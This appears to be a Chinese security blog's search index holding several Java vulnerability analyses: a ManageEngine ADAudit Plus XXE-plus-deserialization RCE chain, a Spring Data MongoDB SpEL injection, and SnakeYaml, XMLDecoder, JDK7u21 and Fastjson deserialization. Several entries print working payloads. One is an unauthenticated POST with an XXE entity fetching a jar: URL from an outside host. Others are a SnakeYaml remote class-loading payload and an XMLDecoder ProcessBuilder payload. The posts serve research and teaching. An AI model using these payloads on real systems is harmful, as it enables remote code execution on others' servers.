[{"categories":[],"content":"前言 最近才看到这个洞，正好无事分析一波 环境搭建 我这里使用的是Win10安装：https://archives2.manageengine.com/active-directory-audit/7055/ManageEngine_ADAudit_Plus_x64.exe 除此之外还需要有域环境，我是使用了server2008搭建了一个域控 漏洞分析 实际上是两个洞结合在一起造成了rce，分别是未授权反序列化和未授权XXE ","date":"2022-07-13","objectID":"/cve-2022-28219-zoho-manageengine-adaudit-plus-xxe%E6%B3%A8%E5%85%A5/:0:0","tags":[],"title":"CVE-2022-28219 ZOHO ManageEngine ADAudit Plus XXE注入","uri":"/cve-2022-28219-zoho-manageengine-adaudit-plus-xxe%E6%B3%A8%E5%85%A5/"},{"categories":[],"content":"反序列化的点 该漏洞点还可以通过目录穿越指定目标文件 先来看一下de.laures.cewolf.storage.FileStorage#getChartImage，通过getFileName将传进来的id参数进行拼接且没有任何的过滤，返回文件路径，然后对指定文件进行反序列化 而在de.laures.cewolf.CewolfRenderer#doGet中会调用getChartImage，可以看到前面提到的id参数就是从request中获取的img值，明显可以看到这是一个servlet类 查看一下web.xml，找到了/cewolf/*接口，接着进行抓包构造，这里往服务器根目录上放一个cb链构造的序列化文件 构造包，并通过目录穿越指定文件进行反序列化触发漏洞弹出计算器 ","date":"2022-07-13","objectID":"/cve-2022-28219-zoho-manageengine-adaudit-plus-xxe%E6%B3%A8%E5%85%A5/:1:0","tags":[],"title":"CVE-2022-28219 ZOHO ManageEngine ADAudit Plus XXE注入","uri":"/cve-2022-28219-zoho-manageengine-adaudit-plus-xxe%E6%B3%A8%E5%85%A5/"},{"categories":[],"content":"XXE的点 这里先放一些解析XML的主要函数(可能存在XXE漏洞的函数) javax.xml.parsers.DocumentBuilderFactory javax.xml.parsers.SAXParser javax.xml.transform.TransformerFactory javax.xml.validation.Validator javax.xml.validation.SchemaFactory javax.xml.transform.sax.SAXTransformerFactory javax.xml.transform.sax.SAXSource org.xml.sax.XMLReader DocumentHelper.parseText DocumentBuilder org.xml.sax.helpers.XMLReaderFactory org.dom4j.io.SAXReader org.jdom.input.SAXBuilder org.jdom2.input.SAXBuilder javax.xml.bind.Unmarshaller javax.xml.xpath.XpathExpression javax.xml.stream.XMLStreamReader org.apache.commons.digester3.Digester rg.xml.sax.SAXParseExceptionpublicId 这个洞就是javax.xml.parsers.DocumentBuilderFactory解析用户传进来的未过滤的参数导致的XXE 在com.adventnet.sym.adsm.auditing.server.category.ProcessTrackingListener#parseTaskContent中，对Task Content或者Task New Content的值进行xml解析触发XXE漏洞 直接来看com.adventnet.sym.adsm.auditing.webclient.ember.api.ADAPAgentAPIServlet和它对应的路由接口，所有请求最后都会进入到executeAgentRequest中 在executeAgentRequest中先是将/api/agent/后的值提取出来，然后在this.agentAPIMapping中匹配取出对应的mappingInfo，这里是我随便输入的值111，而漏洞的点在/tabs/agentData中 更改为目标url后通过反射进入到com.adventnet.sym.adsm.auditing.webclient.ember.api.agent.AgentDataHandler#receiveData中，最后在notify中将post包内容添加到队列中 而在notify函数的类EventDataAdapter中的子类EventDispatcher中会对消息队列进行处理，这里会提取DomainName的值，而该值必须为域环境的域名否则后面会直接抛出异常无法触发漏洞 这里Y4er师傅提到了可以通过/api/agent/configuration/getAgentServerInfo接口获取完整的fqdn，前提是目标配置了agent 在process中，filterEvents会先对消息进行过滤，其中会提取EventCode的值，如果没有的话将会直接抛出异常，而前面讲到的DomainName如果值不是域环境中的域名的话domainMap会为空然后抛出异常 接着会进入到addEventRows中，这里如果EventCode的值在filterEvents中不存在话会导致procesedEventTable为null就触发不了漏洞 在addEventRows中，会通过CategoryId获取eventCategoryListener而为了进入漏洞触发点，它需要为ProcessTrackingListener，而当CategoryId为11时才满足这个条件，而在一开始filterEvents对消息队列进行检测时会通过getCategoriesForEventId获取CategoryId的值，可以看到EventCode的值为592或者4688时都符合(可能还有符合的) 最后进入到getEventRow中，接着进入到parseTaskContent中触发XXE漏洞，这里post包参数还需要有EventType和TimeGenerated，否则的话会直接抛出异常 ","date":"2022-07-13","objectID":"/cve-2022-28219-zoho-manageengine-adaudit-plus-xxe%E6%B3%A8%E5%85%A5/:2:0","tags":[],"title":"CVE-2022-28219 ZOHO ManageEngine ADAudit Plus XXE注入","uri":"/cve-2022-28219-zoho-manageengine-adaudit-plus-xxe%E6%B3%A8%E5%85%A5/"},{"categories":[],"content":"两个点结合rce 这样的话可以通过XXE的jar协议上传一个恶意的序列化文件在通过file协议获取文件的路径，在通过反序列化的点触发即可达到rce的目的 因为jar协议上传文件时如果链接协议断开，文件则会消失，因此使用BlockingServer工具使目标文件长时间停留在目标服务器上 开启BlockingServer，其中aaa.png为通过cb链构造的序列化文件，然后通过jar协议发送post包，此时上传的文件为aaa.png POST /api/agent/tabs/agentData HTTP/1.1 Host: 127.0.0.1:8081 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Content-Type: application/x-www-form-urlencoded Content-Length: 309 [ { \"DomainName\": \"test.com\", \"EventCode\": 592, \"EventType\": 0, \"TimeGenerated\": 0, \"Task Content\": \"\u003c?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?\u003e\u003c!DOCTYPE foo [\u003c!ENTITY data SYSTEM \\\"jar:http://192.168.1.177:9999/qwe.zip!/qwe.txt\\\"\u003e ]\u003e\u003cfoo\u003e\u0026data;\u003c/foo\u003e\" } ] 接着通过xxe-ftp-server工具查看上传的文件路径，其中如果目标系统为windows的话还要知道目标用户(这里可以先通过列举/Users 获取所有用户名)，此时知道了文件名和路径,直接通过反序列化的点指定文件进行触发漏洞 参考链接 https://y4er.com/post/cve-2022-28219-zoho-manageengine-adaudit-plus-xxe-rce/ ","date":"2022-07-13","objectID":"/cve-2022-28219-zoho-manageengine-adaudit-plus-xxe%E6%B3%A8%E5%85%A5/:3:0","tags":[],"title":"CVE-2022-28219 ZOHO ManageEngine ADAudit Plus XXE注入","uri":"/cve-2022-28219-zoho-manageengine-adaudit-plus-xxe%E6%B3%A8%E5%85%A5/"},{"categories":[],"content":"前言 昨天在推特上看到threedr3am师傅发的Spring Data MongoDB SpEL的环境，然后就自己去手动分析了一波，这里用的版本是Spring Data MongoDB 3.3.4 漏洞的原因是当使用@Query或@Aggregation注解进行数据库查询，且使用了占位符获取参数导致的Spel表达式注入 漏洞分析 在diif上可以看到漏洞触发的点 在org.springframework.data.mongodb.util.json.ParameterBindingJsonReader#bindableValueFor中进行绑定参数时触发漏洞，直接在327行打个断点调试，此时expression的值就是构造好的payload，但此时并不会触发漏洞，会在下一次再到这个地方时才会触发漏洞，这里跟进到this.evaluateExpression中看一下 此时this.expressionEvaluator的值为ParameterBindingDocumentCodec，此时会进入到ParameterBindingDocumentCodec中对expression进行处理，最后会返回一个空的对象 接下来比较了在同一个地方两个的堆栈，发现是在org.springframework.data.mongodb.repository.query.StringBasedMongoQuery#createQuery中先进入到getBindingContext进行了参数绑定，看到此时传入的codec就是ParameterBindingDocumentCodec导致第一次并没有触发漏洞，然后绑定参数后在进入到decode中最后会再次进入bindableValueFor中 先来看一下第一次进行参数绑定时进行了什么操作，在org.springframework.data.mongodb.util.json.ParameterBindingJsonReader#readBsonType中，通过switch判断token的Type属性，进入到UNQUOTED_STRING中，在这里进行setCurrentName操作，该值是在bindableValueFor中通过一系列操作后获得，其为实体类中的id参数 接着继续往下走，会经过很多对value值进行equals的对比，此时value是:#0，肯定是false的，最后进入到bindableValueFor中，首先是先把值传给了tokenValue，然后先后对其进行了PARAMETER_BINDING_PATTERN和EXPRESSION_BINDING_PATTERN规则匹配表达式，然后取出值交给binding，在通过substring取出占位符?0，接下来通过for循环将一开始传进来的payload和占位符进行替换，然后执行this.evaluateExpression，因为同时传入的codec，只是返回了一个空的Object实例，最后将value和type进行set后返回bindableValue，这里感觉就是先对实体类的id参数进行了绑定 private static final Pattern PARAMETER_ONLY_BINDING_PATTERN = Pattern.compile(\"^\\\\(\\\\d+)$\"); private static final Pattern PARAMETER_BINDING_PATTERN = Pattern.compile(\"\\\\?(\\\\d+\"); private static final Pattern EXPRESSION_BINDING_PATTERN = Pattern.compile(\"[\\\\?:#\\\\{.*\\\\}\"); 接着进行this.getBindingContext后，会进入到decode中，最后进行一样的操作，此时this.expressionEvaluator为DefaultSpELExpressionEvaluator，最后执行getValue触发SpEl表达式注入 漏洞防御 这里引入的是Spring Data MongoDB 3.3.4 在新版本中额外增加了一个规则匹配表达式，并对binding也就是:#0进行匹配，然后将传进来的payload放入到innerSpelVariables的键值对里，key为特殊字符，最后和binding一起传入到this.evaluateExpression中 private static final Pattern SPEL_PARAMETER_BINDING_PATTERN = Pattern.compile(\"('\\\\?(\\\\d+)'|\\\\?(\\\\d+))\"); 其中进行了三元运算符判断，判断的是this.expressionEvaluator是否为EvaluationContextExpressionEvaluator的实例，然后会是false进入到evaluate，此时传进来的是键值对中的key#__QVar0然后无法触发SpEL表达式注入 public Object evaluateExpression(String expressionString, Map\u003cString, Object\u003evariables) { return this.expressionEvaluator instanceof EvaluationContextExpressionEvaluator ? ((EvaluationContextExpressionEvaluator)this.expressionEvaluator).evaluateExpression(expressionString, variables) : this.expressionEvaluator.evaluate(expressionString); } 参考链接 https://github.com/threedr3am/learnjavabug/tree/master/spring/spring-data-mongodb-spel-CVE-2022-22980 https://github.com/spring-projects/spring-data-mongodb/commit/7c5ac764b343d45e5d0abbaba4e82395b471b4c4?diff=split ","date":"2022-06-23","objectID":"/cve-2022-22980-spring-data-mongodb-spel-rce/:0:0","tags":[],"title":"CVE-2022-22980 Spring Data MongoDB SpEL表达式注入","uri":"/cve-2022-22980-spring-data-mongodb-spel-rce/"},{"categories":[],"content":"前言 继续学习Yaml反序列化，SnakeYaml是Java中用来解析Yaml格式的库，可用于Java对象的序列化和反序列 反序列化分析 先导入SnakeYaml的依赖 \u003cdependency\u003e \u003cgroupId\u003eorg.yaml\u003c/groupId\u003e \u003cartifactId\u003esnakeyaml\u003c/artifactId\u003e \u003cversion\u003e1.27\u003c/version\u003e \u003c/dependency\u003e 接着构造一个User类，试着将这个User类通过yaml进行转换，看一下转换后的效果，其中Yaml中有两个重要的函数： load() :解析传进来的参数，生成相应的Java对象 dump() :将Java对象转换为yaml格式 输出结果中，!! 表示强制类型转换，强制转换为User类型 接着将转换的内容进行load()操作，在yaml.load(str)处打断点进行分析 import org.yaml.snakeyaml.Yaml; public class YamlTest { public static void main(String[] args) { Yaml yaml = new Yaml(); String str = \"!!User {age: '18', name: 张三}\"; yaml.load(str); } } 进入到org.yaml.snakeyaml.Yaml#loadFromReader中，其中str放入到StreamReader中，type为传进来的固定的值Object，经过一系列的设置进入到getSingleData中 会先通过getSingleNode()获取一个Node实例，其中有一个tag属性其值表示为会转换成一个User类型的对象，然后判断node和tag属性是否为空，然后继续判断type是否为Object和根标签是否为空，最后将node传入到constructDocument()中 可以看到data即为转换的User类，而data是在this.constructObject(node)中得到的，继续跟进 接着在org.yaml.snakeyaml.constructor.BaseConstructor#constructObjectNoCheck中，this.constructedObjects.containsKey(node)为false然后进入到constructor.construct(node)中获取data值 继续跟进，先进入到getConstructor中 在getClassForNode中，截取tag属性中的类名User并进行编码后，并将User赋值给Class cl，然后返回，最后是将cl赋值给node的type属性 在construct中，先是通过this.newInstance创建了一个User实例，接着进入到this.constructJavaBean2ndStep 在constructJavaBean2ndStep中，通过while循环在一开始传进来的字符串中提取value值，然后在property.set(object, value)通过反射将value值赋值给创建的User类中，最后return给data返回创建好的User类 这样一来，如果对构造好的恶意的payload进行解析就有可能触发漏洞，这里拿JdbcRowSetImpl类来示范一下，确实触发了JNDI注入弹出计算器 这里注意一点，jdk版本需要满足 8u161 \u003c jdk \u003c 8u191 SPI机制 看了不少的文章都在Yaml反序列时使用了SPI机制去触发弹计算器，这里也记录一下这个知识点(好记性不如烂笔头) SPI（Service Provider Interface），是JDK内置的一种 服务提供发现机制，可以用来启用框架扩展和替换组件，主要是被框架的开发人员使用，比如java.sql.Driver接口，而Java的SPI机制可以为某个接口寻找服务实现。Java中SPI机制主要思想是将装配的控制权移到程序之外，在模块化设计中这个机制尤其重要，其核心思想就是解耦 整体机制如下： 当服务的提供者提供了一种接口的实现之后，需要在classpath下的META-INF/services/目录里创建一个以服务接口命名的文件(文件名为：javax.script.ScriptEngineFactory)，这个文件里的内容就是这个接口的具体的实现类。当其他的程序需要这个服务的时候，就可以通过查找这个jar包（一般都是以jar包做依赖）的META-INF/services/中的配置文件，配置文件中有接口的具体实现类名，可以根据这个类名进行加载实例化，就可以使用该服务了。JDK中查找服务的实现的工具类是：java.util.ServiceLoader 也就是说可以构造一个恶意类，然后在web服务下的META-INF/services/中的配置文件中指定这个恶意类(类需要继承ScriptEngineFactory接口)，然后在yaml.load()中传入触发SPI机制的参数即可 !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1/\"]]]] 在yaml解析的过程中最后实例化ScriptEngineManager然后触发init()，进行一系列赋值后进入到initEngines(loader) 一路跟进到最后在java.util.ServiceLoader.LazyIterator#nextService中，得到要加载的类名，然后在service.cast(c.newInstance())中对加载的恶意类进行实例化然后触发弹计算器 更多的Gadget可参考Mi1k7ea师傅的文章 防御方法 开启new SafeConstructor()即可防御Yaml反序列 Yaml yaml = new Yaml(new SafeConstructor()); 参考链接 https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E https://www.pdai.tech/md/java/advanced/java-advanced-spi.html#java%e5%b8%b8%e7%94%a8%e6%9c%ba%e5%88%b6---spi%e6%9c%ba%e5%88%b6 ","date":"2022-06-18","objectID":"/snakeyaml-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/:0:0","tags":[],"title":"SnakeYaml 反序列化分析","uri":"/snakeyaml-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"},{"categories":[],"content":"简介 XMLDecoder是一套用于对XML进行序列化或反序列化的一套API，它在JDK1.4就已经被开发了出来，它对XML的解析模式并不是更为人所知的DOM解析，而是SAX解析 DOM解析在解析XML时会读取所有数据然后生成DOM树来解析，而SAX则是线性读取XML，所以SAX解析XML性能消耗相对较小 两者区别如下： 在Weblogic中由于was-wast、wls9_async等多个组件使用了XMLDecoder来进行解析xml文档，导致了攻击者可以构造恶意的XML文档来触发反序列化去执行命令，修复方式为采用黑名单禁用object等标签，本文使用jdk7u21去分析XMLDecoder是如何进行操作的 反序列化分析 测试代码如下： import java.beans.XMLDecoder; import java.io.StringBufferInputStream; public class Test { public static void main(String[] args) { String s = \"\u003cjava version=\\\"1.7.0_21\\\"\u003e\\n\" + \" \u003cobject class=\\\"java.lang.ProcessBuilder\\\"\u003e\\n\" + \" \u003carray class=\\\"java.lang.String\\\" length=\\\"1\\\"\u003e\\n\" + \" \u003cvoid index=\\\"0\\\"\u003e\u003cstring\u003ecalc\u003c/string\u003e\u003c/void\u003e\\n\" + \" \u003c/array\u003e\\n\" + \" \u003cvoid method=\\\"start\\\"\u003e\u003c/void\u003e\\n\" + \" \u003c/object\u003e\\n\" + \"\u003c/java\u003e\"; StringBufferInputStream stringBufferInputStream = new StringBufferInputStream(s); XMLDecoder xmlDecoder = new XMLDecoder(stringBufferInputStream); Object o = xmlDecoder.readObject(); } } 直接跟进到xmlDecoder.readObject()中，这里的readObject()并非原生的反序列化readObject()只是同名而已 public Object readObject() { return (parsingComplete()) ? this.array[this.index++] : null; } 继续跟进到java.beans.XMLDecoder#parsingComplete中，通过XMLDecoder.this.handler.parse()去解析XMLDecoder.this.input，而input就是封装过的传进去的xml 在com.sun.beans.decoder.DocumentHandler#parse中通过SAX的工厂模式创建实例并且调用SAX解析，而其中DocumentHandler.this是xml对应标签进行解析处理的Handler 继续跟进到com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl#parse中，先进行设置Handler然后继续解析 进入到重载的SAXParserImpl#parse中继续跟进 在AbstractSAXParser#parse中，将inputSource的值赋值给xmlInputSource并继续解析 在XMLParser#parse中，然后使用XML11Configuration#parse继续对其解析 继续往下走然后在XML11Configuration#parse(boolean)中进入到fCurrentScanner.scanDocument()中 在XMLDocumentFragmentScannerImpl#scanDocument中通过do while循环对xml文档进行遍历解析，其中主要解析方法是在next()中实现 最后在com.sun.beans.decoder.DocumentHandler#startElement中开始对第一个开始标签进行解析，第一个标签为\u003cjava\u003e，通过this.getElementHandler(var3).newInstance()得到JavaElementHandler的实例并赋值给this.handler，然后对Owner和Parent的值进行设置，接下来在for循环中对标签内部的属性进行遍历取值，其中var4.getQName(var6)是对标签内部的属性名称取值，var4.getValue(var6)是对属性的值进行取值，最后调用addAttribute设置属性 然后继续对object标签进行遍历进行取值赋值，接下来以同样的操作对其它的开始标签进行遍历解析，直到开始解析第一个结束标签\u003c/string\u003e 在解析第一个结束标签\u003c/string\u003e时，调用this.handler.endElement()，其中StringElementHandler中没有会根据继承关系调用父类ElementHandler的endElement()中 最后在StringElementHandler#getValueObject中将值取出，然后返回一个存有该值的ValueObjectImpl实例 然后在ElementHandler#endElement中，将ValueObjectImpl的值取出交给this.parent的Handler也就是VoidElementHandler，这里是交给\u003cstring\u003e的父标签也就是\u003cvoid\u003e标签，其中是将值存储在了数组中 \u003cvoid index=\"0\"\u003e\u003cstring\u003ecalc\u003c/string\u003e\u003c/void\u003e 接下来处理\u003c/void\u003e标签，最后在ObjectElementHandler#getValueObject中，通过this.getContextBean()得到var3的类String，在通过var4 = var2.length == 2 ? \"set\" : \"get\"将set赋值给var4，最后new了一个Expression实例，并执行var5.getValue()将存有calc的数组set进去 然后继续处理\u003c/array\u003e标签，通过this.parent.addArgument，将存有calc的数组添加到上一标签也就是\u003cobject\u003e标签的handlerObjectElementHandler中 接下来处理\u003cvoid method=\"start\"\u003e\u003c/void\u003e，在处理\u003c/void\u003e时，在ObjectElementHandler#getValueObject中先通过this.getContextBean()得到了new ProcessBuilder(\"calc\")，然后在通过var4 = this.method != null \u0026\u0026 0 \u003c this.method.length() ? this.method : \"new\";的判断将start赋值给var4，然后new了一个Expression实例，最后执行var5.getValue()，此时拼接为new ProcessBuilder(\"calc\").start()，通过反射弹出计算器 参考链接 https://cloud.tencent.com/developer/article/1957183 ","date":"2022-06-10","objectID":"/java-xmldecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/:0:0","tags":[],"title":"Java XMLDecoder反序列化分析","uri":"/java-xmldecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"},{"categories":[],"content":"前言 继续学习反序列化，这个链子正好用到了前面fastjson反序列化的TemplatesImpl类，这里就不详细讲解该类的具体用法，有兴趣的请看我上一篇fastjson反序列化文章和cc2分析文章 环境复现 这里直接引用了ysoserial.jar这个包，使用其自带的paylaod import ysoserial.payloads.Jdk7u21; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class JDK7u21 { public static void main(String[] args) { try { Object calc = new Jdk7u21().getObject(\"calc\"); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//用于存放person对象序列化byte数组的输出流 ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(calc);//序列化对象 objectOutputStream.flush(); objectOutputStream.close(); byte[] bytes = byteArrayOutputStream.toByteArray(); //读取序列化后的对象byte数组 ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//存放byte数组的输入流 ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); Object o = objectInputStream.readObject(); } catch (Exception e) { e.printStackTrace(); } } } 漏洞分析 首先来看一下LinkedHashSet这个类，它继承了HashSet并实现了Serializable可以进行反序列化，其readObject()方法在父类HashSet中 public class LinkedHashSet\u003cE\u003e extends HashSet\u003cE\u003e implements Set\u003cE\u003e, Cloneable, java.io.Serializable 在其方法内会对map进行put操作，其中PRESENT是new了一个Object空对象 private static final Object PRESENT = new Object(); 进入到java.util.HashMap#put中，在if判断语句内有这样一个关键的点key.equals(k)，为什么它是关键呢？我们知道在动态代理中有这么一个知识点：动态代理对象每执行一个方法时，都会被转发到实现InvocationHandler接口类的invoke方法。也就是说在反序列化时我们将一个动态代理的对象放入到map中，在该方法中执行key.equals(k)时就会触发代理类的invoke方法 在AnnotationInvocationHandler类的invoke方法中，会对动态代理对象执行的方法名字进行判断，当为equals时会进入到equalsImpl中 在equalsImpl中会对传进来的var1类中的方法进行遍历，并通过var8 = var5.invoke(var1)去调用其方法，可以看到当我们传进去的类为TemplatesImpl时，会遍历出getOutputProperties方法并且去调用该方法，而我们知道调用了getOutputProperties就会最后触发TemplatesImpl.newTransformer()然后进行实例化触发恶意操作 这样整条链子就齐了，通过javassist构造一个恶意类，然后对LinkedHashSet进行反序列化触发，其中肯定是需要满足一些条件的，这里就不提TemplatesImpl要满足的点，来看一下在触发key.equals(k)时需要满足的点，这是整个链子最厉害的点 先来看一下第一次进行map.put()传进去的值是什么，可以看见第一次是传进去的TemplatesImpl类 然后获取key的hash，在通过indexFor()获取hash的索引值，然后在for循环中根据索引值进行判断，其中table是一个Entry数组，用来存放我们传进来的键值对，为了后续对新的value和老的value进行判断，其中还有这么一个条件e != null，但是这是我们第一次传进来的键值对，Entry本身就是空的，因此直接跳过循环进行自增，并放入到Entry中 transient Entry\u003cK,V\u003e[] table; 第二次进行map.put()传进去的值是我们封装的AnnotationInvocationHandler对象 这一次就会触发key.equals(k)，但是这里我们需要满足两个条件，才会去触发key.equals(k) e.hash == hash \u0026\u0026 ((k = e.key) == key || key.equals(k)) e.hash == hash 为true (k = e.key) == key 为false 其中e.hash == hash要为true就是说从Entry中提取的hash要和传进来的key的hash要一致，而我们知道for循环是为了更新相同key的value值（其中相同key的判断条件为hash值相等），可是我们传进来的两个key根本就不相同分别是TemplatesImpl和封装的AnnotationInvocationHandler代理对象，如何让其hash相等呢？这里用到了一个新的知识点hash碰撞 hash碰撞就是指两个不同的字符串计算得到的hash值相同 继续看，在第二次进行map.put()时，进行hash值的计算，会通过k.hashCode()计算hash值，而此时k为动态代理对象，它会触发执行AnnotationInvocationHandler的invoke方法 其中进行判断，如果动态代理对象执行的方法名为hashCode时，进入到hashCodeImpl()中 在hashCodeImpl()中，通过迭代器对memberValues对象进行遍历，其中存放着我们传进去的键值对 来看下面这段代码，其中通过异或来获取hash值赋值给var1，其中127 * ((String)var3.getKey()).hashCode()对传进来的key值进行获取hash，此时key为f5a5a608，而它的hash值为0，然后memberValueHashCode(var3.getValue())是对传进来的value值进行获取hash，其中如果值不为数组的话返回hash var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue()) 我们知道0和任何数字进行异或，得到的结果都为被异或数的本身，而此时value为TemplatesImpl，也就是说在第二次进行map.put()时，进行hash值的计算得到的hash值为TemplatesImpl的hash和第一次传进来的一样，这样会在java.util.HashMap#put中符合for循环的判断，为相同hash的key进行value的替换，此时会进入到if条件语句中 e.hash == hash \u0026\u0026 ((k = e.key) == key || key.equals(k)) 此时e.hash == hash为true，而(k = e.key) == key必定为false因为是比较两次传进来的key是否相等，而我们传进来的两个key分别是TemplatesImpl和封装的AnnotationInvocationHandler代理对象，因此这个条件也满足，然后就会触发key.equals(k)，执行恶意操作 参考链接 https://mp.weixin.qq.com/s/qlg3IzyIc79GABSSUyt-OQ https://forum.90sec.com/t/topic/1707/1 https://y4er.com/post/ysoserial-jdk7u21/ ","date":"2022-05-13","objectID":"/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/:0:0","tags":[],"title":"JDK7u21反序列化分析","uri":"/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"},{"categories":[],"content":"前言 继续学习Fastjson反序列化 Fastjson的使用 直接上代码 先引入fastjson1.2.24依赖 \u003cdependency\u003e \u003cgroupId\u003ecom.alibaba\u003c/groupId\u003e \u003cartifactId\u003efastjson\u003c/artifactId\u003e \u003cversion\u003e1.2.24\u003c/version\u003e \u003c/dependency\u003e 创建一个user类 package com.hello.demo.json; public class user { private String name; private int age; private String hobby; public user() { } public user(String name, int age, String hobby) { this.name = name; this.age = age; this.hobby = hobby; } public String getName() { System.out.println(\"调用了getName\"); return name; } public void setName(String name) { System.out.println(\"调用了setName\"); this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } public String getHobby() { return hobby; } public void setHobby(String hobby) { this.hobby = hobby; } @Override public String toString() { return \"user{\" + \"name='\" + name + '\\'' + \", age=\" + age + \", hobby='\" + hobby + '\\'' + '}'; } } 在name的getter/setter中输出了一个调用方便后续调试 然后写一个测试类test package com.hello.demo.json; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.serializer.SerializerFeature; public class test { public static void main(String[] args) { user user = new user(\"张三\",18,\"学习\"); String s1 = JSON.toJSONString(user); // String s2 = JSON.toJSONString(user, SerializerFeature.WriteClassName); System.out.println(s1); // System.out.println(s2); System.out.println(\"-----------------------------------------------------\"); Object parse = JSON.parse(s1); System.out.println(parse); System.out.println(parse.getClass().getName()); System.out.println(\"-----------------------------------------------------\"); Object parse1 = JSON.parseObject(s1); System.out.println(parse1); System.out.println(parse1.getClass().getName()); System.out.println(\"-----------------------------------------------------\"); Object parse2 = JSON.parseObject(s1,Object.class); System.out.println(parse2); System.out.println(parse2.getClass().getName()); } } 看一下test输出的结果 其中JSON.toJSONString(user)的功能为将类转换为json字符串，并且在转换的同时调用了get方法这是fastjson反序列中一个重要的点，这里先记住后面在解释 接着往下看，看下面三行代码，它们输出结果一致，其功能都为将json字符串转化为一个类，且都会转换为JSONObject类，但实则他们的具体实现肯定不一样，parse会转换为@type指定的类，parseObject会默认指定JSONObject类，而在parseObject参数中加一个类参数则会转换为其指定的类（这里指定Object会自动转化为JSONObject） JSON.parse(s1) JSON.parseObject(s1) JSON.parseObject(s1,Object.class) 接下来把测试类test中的注释去掉，且将parse和parseObject的参数改为s2，再来看一下运行结果 先来看第一部分，调用了两次get方法这是因为调用了两次toJSONString，接着看s2的输出结果中带有一个@type参数，值为user类，区别在于在toJSONString中加了一个SerializerFeature.WriteClassName参数，其会将对象类型一起序列化并且会写入到@type字段中 第二部分，parse进行反序列化，因此json字符串中有@type因此会自动执行指定类的set方法，并且会转换为@type指定类的类型 第三部分，parseObject进行反序列话时会自动执行@type指定类的get和set方法，并且转换为JSONObject类 我们来看一下源码就明白了 其实相当于封装了一个parse，先进行了parse然后执行toJSON并且强制转换为JSONObject类 其中parse会调用set方法，toJSON会调用get方法 第四部分，虽然我们指定了类为Object类，但是我们传进去的json字符串中有@type指定的类导致其会转换为其指定的类，那这样我们指定类岂不是多余？接下来我们直接通过代码调试来看一下这个问题 重新建了一个userTest类，并且将json字符串改为没有加@type的s1并且指定类型为我们新建的userTest类，然后输出结果 Object parse2 = JSON.parseObject(s1, userTest.class); System.out.println(parse2); System.out.println(parse2.getClass().getName()); 可以看到这个正是正常的结果，接下来我们再将s1改为指定@type的s2 会抛出异常：类型不匹配，也就是说当传进去带@type字段的json字符串后并不能够将其转换为指定类 这里为什么会这样？如果有兴趣的师傅可以继续探索 回到一开始的问题，为什么指定了Object类后输出结果却为@type指定的类型，直接调试发现了在com.alibaba.fastjson.parser.deserializer.JavaObjectDeserializer#deserialze中进行了对type的判断也就是一开始传的Object.class，会首先判断是否是类，然后如果是Object.class和Serializable.class的话会直接进入到parser.parse(fieldName)中 继续往下跟进会进入到DefaultJSONParser中，会提取@type的值转换为其指定的类，到这里大概就清楚了其原因，这里简单解释一下，有兴趣的师傅可以继续探索 也就是说当我们指定@type为恶意类时，并且其getter/setter有着一定危害时，就会出现无法预估的危害，重点就在于其会自动执行getter/setter，简单的来解释下原理就是通过反射调用get方法获取值，相应的就是通过反射调用set方法存储值，其中getter自动调用还需要满足以下条件： 方法名长度大于4 非静态方法 以get开头且第四个字母为大写 无参数传入 返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong setter自动调用需要满足以下条件： 方法名长度大于4 非静态方法 返回值为void或者当前类 以set开头且第四个字母为大写 参数个数为1个 除此之外Fastjson还有以下功能点： 如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用Feature.SupportNonPublicField参数 fastjson 在为类属性寻找getter/setter方法时，调用函数com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()方法，会忽略_ -字符串 fastjson 在反序列化时，如果Fiel","date":"2022-04-28","objectID":"/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/:0:0","tags":[],"title":"Fastjson 反序列化分析","uri":"/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"},{"categories":[],"content":"1.2.24 在这个版本中有两条链子： com.sun.rowset.JdbcRowSetImpl com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl ","date":"2022-04-28","objectID":"/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/:1:0","tags":[],"title":"Fastjson 